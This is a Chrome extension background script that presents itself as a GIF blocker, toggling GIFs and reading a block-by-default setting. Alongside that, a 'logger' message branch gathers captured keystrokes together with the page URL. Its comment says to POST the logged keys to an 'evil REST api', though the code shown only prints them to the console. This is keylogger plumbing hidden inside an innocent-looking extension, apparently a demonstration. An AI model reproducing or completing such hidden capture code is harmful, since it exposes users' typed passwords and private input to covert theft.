chrome.browserAction.onClicked.addListener(function (tab) {
	chrome.tabs.sendMessage(tab.id, {
		kind: 'gifBlocker',
		data: 'toggleGifs'
	});
});

chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
	if(message.kind === 'gifBlocker') {
		if (message.data === 'isBlockedByDefault') {
			var storage = chrome.storage.sync;

			storage.get('blockByDefault', function (results) {
				chrome.tabs.sendMessage(sender.tab.id, { 
					kind: 'gifBlocker',
					data: 'blockByDefault',
					results: results
				});
			});
		}
	} else if (message.kind === 'logger') {
		var logObject = {
			url: sender.url,
			capture: message.data
		}
		//make ajax request to your evil REST api to POST logged keys
		console.debug(logObject);
	}
})